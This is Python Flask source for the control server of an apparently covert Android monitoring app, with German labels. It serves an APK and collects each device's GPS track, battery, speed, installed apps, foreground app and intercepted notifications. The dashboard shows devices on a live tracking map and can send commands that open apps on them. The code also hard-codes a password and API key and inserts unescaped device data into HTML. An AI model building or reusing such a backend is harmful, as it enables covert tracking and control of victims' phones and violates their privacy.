import os
import json
import time
import requests
from flask import Flask, request, jsonify, send_from_directory, session, redirect, url_for, render_template_string
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

app.secret_key = os.environ.get("SECRET_KEY", "ein_zufaelliger_geheimer_schluessel_123")
GEHEIMES_PASSWORT = "192837465"

# ================= SUPABASE KONFIGURATION =================
SUPABASE_URL = "https://chdjuipbtnmgbmsorhpe.supabase.co"
SUPABASE_KEY = os.environ.get("SUPABASE_KEY", "sb_publishable_bwU_Ywvz9_Od8FPS12mk-w_bscgCvbe")
# ==========================================================

SUPABASE_HEADERS = {
    "apikey": SUPABASE_KEY,
    "Authorization": f"Bearer {SUPABASE_KEY}",
    "Content-Type": "application/json",
    "Prefer": "resolution=merge-duplicates"
}

def hole_daten_von_supabase():
    try:
        url = f"{SUPABASE_URL}/rest/v1/geraete_daten?select=*"
        antwort = requests.get(url, headers=SUPABASE_HEADERS, timeout=5)
        if antwort.status_code == 200:
            daten_liste = antwort.json()
            geraete_dict = {}
            for geraet in daten_liste:
                name = geraet["name"]
                geraete_dict[name] = {
                    "lat": float(geraet.get("lat", 51.1657)),
                    "lon": float(geraet.get("lon", 10.4515)),
                    "akku": str(geraet.get("akku", "??")),
                    "netzwerk": str(geraet.get("netzwerk", "Aktiv")),
                    "speed": str(geraet.get("speed", "0")),
                    "bedienungshilfen": str(geraet.get("bedienungshilfen", "Unbekannt")),
                    "aktuelle_app": str(geraet.get("aktuelle_app", "Keine")),
                    "installierte_apps": geraet.get("installierte_apps", "[]"),
                    "aktueller_befehl": geraet.get("aktueller_befehl", ""),
                    "historie": geraet.get("historie", []),
                    "zeitstempel": int(geraet.get("zeitstempel", int(time.time())))
                }
            return geraete_dict
    except Exception as e:
        print(f"Fehler beim Laden aus Supabase: {e}")
    return {}

@app.route('/', methods=['GET'])
def index():
    ist_eingeloggt = session.get('eingeloggt', False)
    
    if not ist_eingeloggt:
        return """
        <div style="display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5;">
            <div style="background: white; padding: 40px; border-radius: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center;">
                <h2 style="margin-bottom: 10px; color: #1e293b; font-size: 24px;">🔒 Security Control</h2>
                <p style="color: #64748b; margin-bottom: 25px; font-size: 14px;">Bitte gib das Master-Passwort ein</p>
                <form action="/login" method="POST">
                    <input type="password" name="passwort" placeholder="Passwort eingeben..." required 
                           style="width: 100%; padding: 12px; border: 1px solid #cbd5e1; border-radius: 8px; margin-bottom: 20px; font-size: 16px; box-sizing: border-box; outline: none; transition: border 0.2s;">
                    <button type="submit" style="width: 100%; background: #2563eb; color: white; border: none; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px;">Dashboard entsperren</button>
                </form>
            </div>
        </div>
        """
    
    dashboard_html = """
    <!DOCTYPE html>
    <html lang="de">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>HQ Control Center</title>
        <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
        <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
        <style>
            * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; }
            body { background: #f8fafc; color: #1e293b; display: flex; height: 100vh; overflow: hidden; }
            .sidebar { width: 260px; background: #0f172a; color: white; padding: 25px 20px; display: flex; flex-direction: column; justify-content: space-between; }
            .sidebar-brand { font-size: 20px; font-weight: 800; letter-spacing: 1px; color: #38bdf8; display: flex; align-items: center; gap: 10px; margin-bottom: 40px; }
            .nav-item { padding: 12px 15px; border-radius: 8px; color: #94a3b8; text-decoration: none; font-weight: 600; display: flex; align-items: center; gap: 12px; margin-bottom: 8px; transition: all 0.2s; }
            .nav-item:hover, .nav-item.active { background: #1e293b; color: white; }
            .btn-logout { color: #f1f5f9; background: #ef4444; text-align: center; justify-content: center; margin-top: auto; padding: 12px; border-radius: 8px; font-weight: 600; text-decoration: none;}
            .btn-logout:hover { background: #dc2626; }
            .main-content { flex: 1; display: flex; flex-direction: column; overflow-y: auto; padding: 30px; }
            .header-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; flex-wrap: wrap; gap: 15px; }
            .header-title h1 { font-size: 26px; color: #0f172a; font-weight: 700; }
            .status-banner { display: flex; gap: 20px; background: white; padding: 15px 20px; border-radius: 12px; box-shadow: 0 1px 3px rgba(0,0,0,0.05); border: 1px solid #e2e8f0; font-size: 14px; margin-bottom: 25px; color: #64748b; flex-wrap: wrap; align-items: center; }
            .refresh-btn { background: #2563eb; color: white; border: none; padding: 6px 14px; border-radius: 6px; cursor: pointer; font-weight: 600; font-size: 13px; transition: background 0.2s; }
            .refresh-btn:hover { background: #1d4ed8; }
            .grid-container { display: grid; grid-template-columns: 2fr 1fr; gap: 25px; }
            @media (max-width: 900px) { .grid-container { grid-template-columns: 1fr; } }
            .card { background: white; border-radius: 12px; border: 1px solid #e2e8f0; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05); padding: 20px; margin-bottom: 25px; }
            .card-title { font-size: 16px; font-weight: 700; color: #0f172a; margin-bottom: 15px; display: flex; align-items: center; gap: 8px; border-bottom: 1px solid #f1f5f9; padding-bottom: 10px; }
            #map { height: 450px; width: 100%; border-radius: 10px; background: #e2e8f0; border: 1px solid #cbd5e1; }
            .download-box { background: linear-gradient(135deg, #0284c7, #0369a1); color: white; }
            .btn-download { display: inline-block; background: white; color: #0369a1; padding: 10px 20px; text-decoration: none; border-radius: 8px; font-weight: bold; font-size: 14px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); transition: transform 0.2s; }
            .btn-download:hover { transform: translateY(-1px); }
            .device-table { width: 100%; border-collapse: collapse; text-align: left; font-size: 14px; }
            .device-table th { background: #f8fafc; color: #64748b; font-weight: 600; padding: 12px; border-bottom: 2px solid #e2e8f0; }
            .device-table td { padding: 12px; border-bottom: 1px solid #f1f5f9; vertical-align: middle; }
            .badge { display: inline-block; padding: 4px 8px; border-radius: 6px; font-size: 12px; font-weight: 700; }
            .badge-success { background: #dcfce7; color: #15803d; }
            .badge-danger { background: #fee2e2; color: #b91c1c; }
            .badge-info { background: #e0f2fe; color: #0369a1; }
            .badge-purple { background: #f3e8ff; color: #6b21a8; }
            .badge-warning { background: #fef9c3; color: #a16207; }
            .control-panel select { width: 100%; padding: 10px; border-radius: 8px; border: 1px solid #cbd5e1; background: #f8fafc; font-size: 14px; outline: none; margin-bottom: 12px; }
            .control-panel button { width: 100%; background: #10b981; color: white; border: none; padding: 12px; border-radius: 8px; font-weight: 700; cursor: pointer; font-size: 14px; transition: background 0.2s; }
            .control-panel button:hover { background: #059669; }
        </style>
    </head>
    <body>
        <div class="sidebar">
            <div>
                <div class="sidebar-brand">📡 SYSTEM CONTROL</div>
                <a href="#" class="nav-item active">📊 Live Dashboard</a>
                <a href="/download" class="nav-item">📥 APK Download</a>
            </div>
            <a href="/logout" class="btn-logout">Abmelden ➔</a>
        </div>

        <div class="main-content">
            <div class="header-bar">
                <div class="header-title"><h1>Echtzeit &Uuml;berwachungs-Zentrale</h1></div>
                <div class="card download-box" style="margin: 0; padding: 12px 20px; display: flex; align-items: center; gap: 15px;">
                    <span style="font-size: 14px; font-weight: 600;">System-Client installieren:</span>
                    <a href="/download" class="btn-download">📥 APK Download</a>
                </div>
            </div>

            <div class="status-banner">
                <div id="zeit-seit-update" style="flex: 1;">⏱️ Letzter Webseiten-Abruf: Gerade eben</div>
                <div id="zeit-bis-update" style="width: 220px;">🔄 Nächstes Live-Update in: 00:05</div>
                <button onclick="datenVomServerHolen()" class="refresh-btn">Jetzt aktualisieren ⚡</button>
            </div>

            <div class="grid-container">
                <div><div class="card"><div class="card-title">🗺️ Global Live-Map Tracking</div><div id="map"></div></div></div>
                <div>
                    <div class="card control-panel">
                        <div class="card-title">🛠️ Live App-Fernsteuerung</div>
                        <select id="deviceSelect" onchange="updateAppDropdown()"><option value="">-- Ger&auml;t ausw&auml;hlen --</option></select>
                        <select id="appSelect" disabled><option value="">-- Zuerst Ger&auml;t w&auml;hlen --</option></select>
                        <button onclick="sendeRemoteBefehl()">🚀 App-Startbefehl senden</button>
                    </div>
                </div>
            </div>

            <div class="card" style="margin-top: 5px;">
                <div class="card-title">📱 Registrierte Ger&auml;te</div>
                <div style="overflow-x: auto;">
                    <table class="device-table">
                        <thead>
                            <tr>
                                <th>Status/Name</th><th>Akku</th><th>Tempo</th><th>Netzwerk</th><th>Letzter Abfang-Status</th><th>Systemhilfe</th><th>Funkspruch</th><th style="text-align: right;">Aktion</th>
                            </tr>
                        </thead>
                        <tbody id="device-table-body">
                            <tr><td colspan="8" style="text-align: center; color: #94a3b8; font-style: italic; padding: 30px;">Warte auf Daten...</td></tr>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>

        <script>
            let map;
            let markerMap = {};
            let linienMap = {};
            let geraete = {};
            let letzterAbrufZeitstempel = Math.floor(Date.now() / 1000);
            let kartenZentrierungErfolgt = false;

            function startKarte() {
                // 🔥 CRASH-SCHUTZ: Falls Leaflet unvollständig geladen wurde, kurz warten und neustarten
                if (typeof L === 'undefined') {
                    console.warn("Leaflet (L) ist noch nicht bereit. Warte kurz...");
                    setTimeout(startKarte, 100);
                    return;
                }

                // Behebt Leaflet-Icon Fehler
                delete L.Icon.Default.prototype._getIconUrl;
                L.Icon.Default.mergeOptions({
                    iconRetinaUrl: 'https://unpkg.com/leaflet@1.9.4/dist/images/marker-icon-2x.png',
                    iconUrl: 'https://unpkg.com/leaflet@1.9.4/dist/images/marker-icon.png',
                    shadowUrl: 'https://unpkg.com/leaflet@1.9.4/dist/images/marker-shadow.png',
                });

                map = L.map('map').setView([51.1657, 10.4515], 5);
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '&copy; OpenStreetMap' }).addTo(map);
                datenVomServerHolen();

                setInterval(function() {
                    const JETZT = Math.floor(Date.now() / 1000);
                    let sekundenSeitUpdate = JETZT - letzterAbrufZeitstempel;
                    let sekundenBisUpdate = 5 - sekundenSeitUpdate;
                    if (sekundenBisUpdate <= 0) { datenVomServerHolen(); return; }
                    document.getElementById('zeit-seit-update').innerHTML = "⏱️ Letzter Webseiten-Abruf: vor " + sekundenSeitUpdate + " Sek.";
                    document.getElementById('zeit-bis-update').innerHTML = "🔄 Nächstes Live-Update in: 00:0" + sekundenBisUpdate;
                }, 1000);
            }

            function updateUI(daten) {
                if (!daten || typeof L === 'undefined' || !map) return;
                geraete = daten;
                for (const name in daten) {
                    const info = daten[name];
                    if (!info.lat || !info.lon) continue;
                    const popupText = "<b>" + name + "</b><br>🔋 Akku: " + info.akku + "%<br>📱 Status: " + info.aktuelle_app;
                    if (markerMap[name]) {
                        markerMap[name].setLatLng([info.lat, info.lon]);
                        markerMap[name].getPopup().setContent(popupText);
                    } else {
                        markerMap[name] = L.marker([info.lat, info.lon]).addTo(map).bindPopup(popupText);
                    }
                    if (info.historie && info.historie.length > 1) {
                        if (linienMap[name]) { map.removeLayer(linienMap[name]); }
                        linienMap[name] = L.polyline(info.historie, {color: '#2563eb', weight: 4, opacity: 0.6}).addTo(map);
                    }
                }

                const devSelect = document.getElementById('deviceSelect');
                const aktuellerWert = devSelect.value;
                devSelect.innerHTML = '<option value="">-- Ger&auml;t ausw&auml;hlen --</option>';
                for (const name in daten) {
                    const opt = document.createElement('option'); opt.value = name; opt.textContent = name;
                    if(name === aktuellerWert) opt.selected = true;
                    devSelect.appendChild(opt);
                }
                if(devSelect.value) { updateAppDropdown(); }

                const tbody = document.getElementById('device-table-body');
                if (Object.keys(daten).length === 0) {
                    tbody.innerHTML = '<tr><td colspan="8" style="text-align: center; color: #94a3b8; padding: 20px;">Keine Ger&auml;te aktiv</td></tr>';
                    return;
                }

                let html = "";
                const jetzt = Math.floor(Date.now() / 1000);
                for (const name in daten) {
                    const info = daten[name];
                    const diff = jetzt - (info.zeitstempel || jetzt);
                    let zeitText = diff < 60 ? "vor " + diff + " Sek." : "vor " + Math.floor(diff / 60) + " Min.";
                    let akkuKlasse = "badge-success";
                    if (parseInt(info.akku) <= 20) akkuKlasse = "badge-danger";
                    let appBadgeHTML = "";
                    let roherText = info.aktuelle_app;
                    if(roherText.includes("[BLOCKIERT]")) {
                        appBadgeHTML = '<span class="badge badge-danger">🚫 Sperre</span> <small>' + roherText.replace("[BLOCKIERT] ","") + '</small>';
                    } else if(roherText.includes("[🔔 PUSH")) {
                        appBadgeHTML = '<span class="badge badge-purple">🔔 Push</span> <small>' + roherText.split("]: ")[1] + '</small>';
                    } else {
                        appBadgeHTML = '<span class="badge badge-info">' + roherText + '</span>';
                    }

                    html += '<tr>' +
                        '<td><strong>🟢 ' + name + '</strong></td>' +
                        '<td><span class="badge ' + akkuKlasse + '">' + info.akku + '%</span></td>' +
                        '<td><span class="badge badge-info">' + info.speed + ' km/h</span></td>' +
                        '<td><span class="badge badge-warning">' + info.netzwerk + '</span></td>' +
                        '<td>' + appBadgeHTML + '</td>' +
                        '<td><span class="badge badge-success">♿ ' + info.bedienungshilfen + '</span></td>' +
                        '<td><small>' + zeitText + '</small></td>' +
                        '<td style="text-align: right;"><a href="/delete/' + encodeURIComponent(name) + '" class="badge badge-danger" style="text-decoration:none;" onclick="return confirm(\'L&ouml;schen?\');">🗑&FE0F;</a></td>' +
                    '</tr>';
                }
                tbody.innerHTML = html;
            }

            function updateAppDropdown() {
                const devSelect = document.getElementById('deviceSelect');
                const appSelect = document.getElementById('appSelect');
                const gewaehltesGeraet = devSelect.value;
                if (!gewaehltesGeraet || !geraete[gewaehltesGeraet]) {
                    appSelect.innerHTML = '<option value="">-- Zuerst Ger&auml;t w&auml;hlen --</option>'; appSelect.disabled = true; return;
                }
                appSelect.disabled = false;
                let appsRaw = geraete[gewaehltesGeraet].installierte_apps;
                if (typeof appsRaw === 'string') { try { appsRaw = JSON.parse(appsRaw); } catch(e) { appsRaw = []; } }
                if (Array.isArray(appsRaw) && appsRaw.length > 0) {
                    appSelect.innerHTML = '<option value="">-- Bitte App ausw&auml;hlen --</option>';
                    appsRaw.forEach(app => {
                        const opt = document.createElement('option'); opt.value = app.paket; opt.textContent = app.name; appSelect.appendChild(opt);
                    });
                } else { appSelect.innerHTML = '<option disabled selected>Keine Apps gemeldet</option>'; }
            }

            function sendeRemoteBefehl() {
                const geraeteName = document.getElementById('deviceSelect').value;
                const paketName = document.getElementById('appSelect').value;
                if (!geraeteName || !paketName) { alert("Bitte ausw&auml;hlen!"); return; }
                if (confirm("App-Startbefehl senden?")) {
                    fetch('/api/sende_befehl', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ name: geraeteName, paket: paketName })
                    })
                    .then(res => res.json())
                    .then(data => { if (data.status === "success") { alert("Erfolgreich gespeichert!"); } });
                }
            }

            function datenVomServerHolen() {
                fetch('/api/data')
                    .then(response => { if (response.status === 401) { window.location.reload(); } return response.json(); })
                    .then(neueDaten => {
                        updateUI(neueDaten);
                        if (!kartenZentrierungErfolgt) {
                            const keys = Object.keys(neueDaten);
                            if (keys.length > 0 && neueDaten[keys[0]]) {
                                if (typeof map !== 'undefined' && map) {
                                    map.setView([neueDaten[keys[0]].lat || 51.1657, neueDaten[keys[0]].lon || 10.4515], 13);
                                    kartenZentrierungErfolgt = true;
                                }
                            }
                        }
                        letzterAbrufZeitstempel = Math.floor(Date.now() / 1000);
                    }).catch(e => console.error("API-Abruffehler:", e));
            }

            // Wartet, bis alle Ressourcen (auch externe Skripte) komplett da sind
            window.addEventListener('load', startKarte);
        </script>
    </body>
    </html>
    """
    return render_template_string(dashboard_html)

# ================= API ENDPUNKTE =================

@app.route('/api/sende_befehl', methods=['POST'])
def speichere_befehl():
    if not session.get('eingeloggt', False):
        return jsonify({"error": "Nicht autorisiert"}), 401
    data = request.get_json() or {}
    geraete_name = data.get("name")
    ziel_paket = data.get("paket")
    
    befehls_payload = {"befehl": "oeffne_app", "paket": ziel_paket}
    try:
        url = f"{SUPABASE_URL}/rest/v1/geraete_daten?name=eq.{geraete_name}"
        res = requests.patch(url, json={"aktueller_befehl": json.dumps(befehls_payload)}, headers=SUPABASE_HEADERS, timeout=5)
        return jsonify({"status": "success" if res.status_code in [200, 204] else "error"})
    except Exception:
        return jsonify({"error": "Fehler"}), 500

@app.route('/api/data', methods=['GET'])
def get_live_data():
    if not session.get('eingeloggt', False):
        return jsonify({}), 401
    return jsonify(hole_daten_von_supabase())

@app.route('/login', methods=['POST'])
def login():
    if request.form.get('passwort') == GEHEIMES_PASSWORT:
        session['eingeloggt'] = True
    return redirect(url_for('index'))

@app.route('/logout')
def logout():
    session.pop('eingeloggt', None)
    return redirect(url_for('index'))

@app.route('/favicon.ico')
def favicon():
    return '', 204

@app.route('/download', methods=['GET'])
def download_apk():
    return send_from_directory(directory='static', path='app.apk', as_attachment=True)

@app.route('/upload', methods=['POST'])
def upload():
    if not request.is_json:
        return jsonify({"error": "Missing JSON"}), 400
    data = request.get_json()
    
    roher_name = str(data.get("name", "Unbekanntes_Geraet")).replace("ä", "ae").replace("ö", "oe").replace("ü", "ue")
    absender_ip = request.remote_addr or "IP"
    geraete_name = f"{roher_name}_{absender_ip[-4:]}"

    try:
        lat, lon = float(data.get("lat", 51.1657)), float(data.get("lon", 10.4515))
    except (TypeError, ValueError):
        lat, lon = 51.1657, 10.4515
        
    akku = str(data.get("akku", "??"))
    netzwerk = str(data.get("netzwerk", "Unbekannt"))
    speed = str(data.get("speed", "0"))
    aktuelle_app = str(data.get("aktuelle_app", "Keine App erkannt")).replace("ä", "ae").replace("ö", "oe").replace("ü", "ue")
    
    installierte_apps = data.get("installierte_apps", "[]")
    if isinstance(installierte_apps, (list, dict)):
        installierte_apps = json.dumps(installierte_apps)
        
    bedienungshilfen = "Aktiv" if aktuelle_app != "Keine App geoeffnet" else "Inaktiv"
    historie, befehl_fuer_handy = [], "{}"
    
    try:
        check_url = f"{SUPABASE_URL}/rest/v1/geraete_daten?name=eq.{geraete_name}&select=historie,aktueller_befehl"
        res = requests.get(check_url, headers=SUPABASE_HEADERS, timeout=5)
        if res.status_code == 200 and len(res.json()) > 0:
            db_eintrag = res.json()[0]
            historie = db_eintrag.get("historie", [])
            befehl_fuer_handy = db_eintrag.get("aktueller_befehl", "{}") or "{}"
    except Exception:
        pass

    historie.append([lat, lon])
    if len(historie) > 15: historie.pop(0)

    payload = {
        "name": geraete_name, "lat": lat, "lon": lon, "akku": akku, "netzwerk": netzwerk,
        "speed": speed, "bedienungshilfen": bedienungshilfen, "aktuelle_app": aktuelle_app,
        "installierte_apps": installierte_apps, "historie": historie, "zeitstempel": int(time.time())
    }

    try:
        url = f"{SUPABASE_URL}/rest/v1/geraete_daten?on_conflict=name"
        headers_upsert = SUPABASE_HEADERS.copy()
        headers_upsert["Prefer"] = "return=representation,resolution=merge-duplicates"
        res = requests.post(url, json=payload, headers=headers_upsert, timeout=5)
        
        if res.status_code in [200, 201]:
            if befehl_fuer_handy != "{}":
                try: requests.patch(f"{SUPABASE_URL}/rest/v1/geraete_daten?name=eq.{geraete_name}", json={"aktueller_befehl": ""}, headers=SUPABASE_HEADERS, timeout=3)
                except Exception: pass
            return jsonify({"status": "ok", "befehl": befehl_fuer_handy}), 200
        return jsonify({"status": "error", "befehl": "{}"}), 200
    except Exception:
        return jsonify({"status": "error", "befehl": "{}"}), 200

@app.route('/delete/<name>', methods=['GET', 'POST'])
def delete_device(name):
    if session.get('eingeloggt', False):
        try:
            url = f"{SUPABASE_URL}/rest/v1/geraete_daten?name=eq.{name}"
            requests.delete(url, headers=SUPABASE_HEADERS, timeout=5)
        except Exception: pass
    return redirect(url_for('index'))
    
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
